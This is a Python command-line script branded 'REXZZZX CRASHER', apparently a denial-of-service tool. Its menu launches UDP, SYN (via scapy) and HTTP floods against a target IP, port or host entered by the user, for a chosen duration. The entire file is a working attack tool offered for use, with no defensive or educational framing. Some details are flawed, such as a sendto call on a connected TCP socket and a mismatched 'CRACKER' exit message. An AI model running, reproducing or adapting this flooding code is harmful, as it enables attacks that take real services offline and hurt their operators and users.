#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import pyfiglet
from scapy.all import *

class RexzzzxCrasher:
    def __init__(self):
        self.banner = pyfiglet.figlet_format("REXZZZX CRASHER")
        self.author = "Created by REXZZZX TEAM"
        self.version = "v1.0"
        
    def show_menu(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(self.banner)
        print(f"{self.author} - {self.version}\n")
        print("1. DDoS Attack (UDP Flood)")
        print("2. DDoS Attack (SYN Flood)")
        print("3. DDoS Attack (HTTP Flood)")
        print("4. Exit")
        
    def udp_flood(self, target_ip, target_port, duration):
        time_end = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        
        print(f"\n[+] Starting UDP Flood to {target_ip}:{target_port} for {duration} seconds")
        
        while time.time() < time_end:
            sock.sendto(bytes, (target_ip, target_port))
        
        print("[+] UDP Flood attack completed!")
        
    def syn_flood(self, target_ip, target_port, duration):
        time_end = time.time() + duration
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        
        print(f"\n[+] Starting SYN Flood to {target_ip}:{target_port} for {duration} seconds")
        
        while time.time() < time_end:
            send(ip/tcp, verbose=0)
        
        print("[+] SYN Flood attack completed!")
        
    def http_flood(self, target_url, duration):
        time_end = time.time() + duration
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept-Language: en-US,en;q=0.5"
        ]
        
        print(f"\n[+] Starting HTTP Flood to {target_url} for {duration} seconds")
        
        while time.time() < time_end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((socket.gethostbyname(target_url), 80))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target_url}\r\n{'\\r\\n'.join(headers)}\r\n\r\n".encode(), (target_url, 80))
                s.close()
            except:
                pass
        
        print("[+] HTTP Flood attack completed!")
        
    def run(self):
        while True:
            self.show_menu()
            choice = input("\nSelect option: ")
            
            if choice == "1":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter attack duration (seconds): "))
                self.udp_flood(target_ip, target_port, duration)
                
            elif choice == "2":
                target_ip = input("Enter target IP: ")
                target_port = int(input("Enter target port: "))
                duration = int(input("Enter attack duration (seconds): "))
                self.syn_flood(target_ip, target_port, duration)
                
            elif choice == "3":
                target_url = input("Enter target URL (without http://): ")
                duration = int(input("Enter attack duration (seconds): "))
                self.http_flood(target_url, duration)
                
            elif choice == "4":
                print("\n[+] Exiting REXZZZX CRACKER...")
                sys.exit()
                
            else:
                print("\n[!] Invalid option, please try again")
                time.sleep(1)

if __name__ == "__main__":
    try:
        tool = RexzzzxCrasher()
        tool.run()
    except KeyboardInterrupt:
        print("\n[!] Program stopped by user")
        sys.exit()
